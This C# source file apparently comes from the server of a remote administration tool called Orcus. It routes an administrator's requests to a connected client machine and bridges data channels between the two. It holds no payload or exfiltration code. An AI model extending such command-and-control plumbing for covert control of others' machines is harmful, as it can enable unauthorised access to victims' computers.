using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Orcus.Modules.Api;
using Orcus.Modules.Api.Request;
using Orcus.Server.Connection.Commanding;
using Orcus.Server.Library.Services;
using Orcus.Sockets;

namespace Orcus.Server.Service
{
    public interface ICommandDistributer
    {
        Task Execute(OrcusRequest request, CommandTargetCollection targets, CommandExecutionPolicy executionPolicy);
        Task<HttpResponseMessage> Execute(HttpRequestMessage request, int clientId, int accountId, CancellationToken cancellationToken);
    }

    public class CommandDistributer : ICommandDistributer
    {
        private readonly IConnectionManager _connectionManager;

        public CommandDistributer(IConnectionManager connectionManager)
        {
            _connectionManager = connectionManager;
        }

        public Task Execute(OrcusRequest request, CommandTargetCollection targets,
            CommandExecutionPolicy executionPolicy) =>
            throw new NotImplementedException();

        public async Task<HttpResponseMessage> Execute(HttpRequestMessage request, int clientId, int accountId, CancellationToken cancellationToken)
        {
            if (_connectionManager.ClientConnections.TryGetValue(clientId, out var clientConnection))
            {
                var response = await clientConnection.SendRequest(request, cancellationToken);
                if (response.StatusCode == HttpStatusCode.Created && response.Headers.Location?.Host == "channels")
                {
                    if (_connectionManager.AdministrationConnections.TryGetValue(accountId, out var administrationConnection))
                    {
                        var channelId = int.Parse(response.Headers.Location.AbsolutePath.Trim('/'));
                        new OrcusChannelRedirect(channelId, clientConnection.OrcusServer, administrationConnection.OrcusServer);
                    }
                }
                return response;
            }

            throw new ClientNotFoundException();
        }
    }

    public class OrcusChannelRedirect : IDataChannel
    {
        private readonly Channel _channel;

        public OrcusChannelRedirect(int channelId, OrcusServer server1, OrcusServer server2)
        {
            server1.AddChannel(this, channelId);

            _channel = new Channel {DataReceived = DataReceived};
            server2.AddChannel(_channel, channelId);
        }

        private void DataReceived(ArraySegment<byte> obj)
        {
            Send(obj.Array, obj.Offset, obj.Count, true);
        }

        public void Dispose()
        {
        }

        public int RequiredOffset { get; set; }
        public SendDelegate Send { get; set; }

        public void ReceiveData(byte[] buffer, int offset, int count)
        {
            _channel.Send(buffer, offset, count, true);
        }

        private class Channel : IDataChannel
        {
            public void Dispose()
            {
            }

            public Action<ArraySegment<byte>> DataReceived;

            public int RequiredOffset { get; set; }
            public SendDelegate Send { get; set; }

            public void ReceiveData(byte[] buffer, int offset, int count)
            {
                DataReceived.Invoke(new ArraySegment<byte>(buffer, offset, count));
            }
        }
    }

    public class ClientNotFoundException : Exception
    {
    }
}